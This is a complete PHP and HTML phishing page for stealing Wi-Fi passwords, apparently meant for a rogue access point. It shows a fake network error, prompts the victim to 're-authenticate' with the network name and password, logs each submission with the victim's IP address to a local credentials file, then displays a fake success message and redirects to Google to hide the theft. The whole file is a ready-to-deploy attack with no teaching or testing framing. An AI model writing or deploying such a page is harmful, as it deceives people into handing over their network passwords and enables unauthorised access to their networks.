<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['wifi_password'])) {
    $ssid = htmlspecialchars($_POST['ssid'] ?? 'Unknown');
    $password = $_POST['wifi_password'];
    
    $log = date('Y-m-d H:i:s') . " | SSID: $ssid | Password: $password | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    file_put_contents('credentials.txt', $log, FILE_APPEND);
    
    $showSuccess = true;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Connection Error</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #fff;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
            overflow: hidden;
        }
        .error-header {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            padding: 40px 30px;
            text-align: center;
            color: white;
        }
        .error-icon {
            width: 60px;
            height: 60px;
            border: 3px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
            font-weight: bold;
            color: white;
        }
        .error-header h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }
        .error-header p {
            opacity: 0.9;
            font-size: 14px;
        }
        .content {
            padding: 30px;
        }
        .error-details {
            background: #f8f9fa;
            border-left: 4px solid #e74c3c;
            padding: 15px;
            margin-bottom: 25px;
            border-radius: 0 8px 8px 0;
        }
        .error-details code {
            color: #e74c3c;
            font-weight: 600;
        }
        .error-details p {
            color: #666;
            font-size: 13px;
            margin-top: 5px;
        }
        .retry-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .retry-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(52, 152, 219, 0.4);
        }
        
        .auth-form {
            display: none;
        }
        .auth-form.active {
            display: block;
        }
        .auth-header {
            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
            padding: 40px 30px;
            text-align: center;
            color: white;
        }
        .wifi-icon {
            width: 60px;
            height: 60px;
            border: 3px solid white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 24px;
            font-weight: bold;
            color: white;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
            font-size: 14px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #3498db;
        }
        .network-info {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 12px 16px;
            background: #e8f4fd;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        .network-info span {
            color: #2980b9;
            font-weight: 500;
        }
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #27ae60 0%, #219a52 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(39, 174, 96, 0.4);
        }
        .footer {
            text-align: center;
            padding: 15px;
            background: #f8f9fa;
            color: #888;
            font-size: 12px;
        }
        
        .success-container {
            display: none;
            text-align: center;
            padding: 40px 30px;
        }
        .success-container.active {
            display: block;
        }
        .success-icon {
            width: 60px;
            height: 60px;
            background: #27ae60;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px;
            color: white;
            font-weight: bold;
        }
        .success-container h2 {
            color: #27ae60;
            margin-bottom: 10px;
        }
        .success-container p {
            color: #666;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #3498db;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <?php if (isset($showSuccess) && $showSuccess): ?>
        <div class="success-container active">
            <div class="success-icon">OK</div>
            <h2>Reconnecting...</h2>
            <p>Authentication successful. Please wait while we restore your connection.</p>
            <div class="loader"></div>
        </div>
        <script>
            setTimeout(function() {
                window.location.href = 'https://www.google.com';
            }, 3000);
        </script>
        <?php else: ?>
        <div id="errorScreen">
            <div class="error-header">
                <div class="error-icon">!</div>
                <h1>Service Unavailable</h1>
                <p>Unable to establish network connection</p>
            </div>
            <div class="content">
                <div class="error-details">
                    <code>Error 503: Service Temporarily Unavailable</code>
                    <p>The network authentication service is currently unavailable. Please re-authenticate to restore your connection.</p>
                </div>
                <button class="retry-btn" onclick="showAuthForm()">
                    Retry Connection
                </button>
            </div>
            <div class="footer">
                Network Security Portal
            </div>
        </div>
        
        <div id="authForm" class="auth-form">
            <div class="auth-header">
                <div class="wifi-icon">WiFi</div>
                <h1>WiFi Re-Authentication</h1>
                <p>Enter your credentials to reconnect</p>
            </div>
            <div class="content">
                <form method="POST" action="">
                    <div class="network-info">
                        <span>Secured Network</span>
                    </div>
                    <div class="form-group">
                        <label for="ssid">Network Name (SSID)</label>
                        <input type="text" id="ssid" name="ssid" placeholder="Enter network name" required>
                    </div>
                    <div class="form-group">
                        <label for="wifi_password">WiFi Password</label>
                        <input type="password" id="wifi_password" name="wifi_password" placeholder="Enter your WiFi password" required>
                    </div>
                    <button type="submit" class="submit-btn">
                        Connect
                    </button>
                </form>
            </div>
            <div class="footer">
                Secure Connection
            </div>
        </div>
        
        <?php endif; ?>
    </div>
    
    <script>
        function showAuthForm() {
            document.getElementById('errorScreen').style.display = 'none';
            document.getElementById('authForm').classList.add('active');
        }
    </script>
</body>
</html>
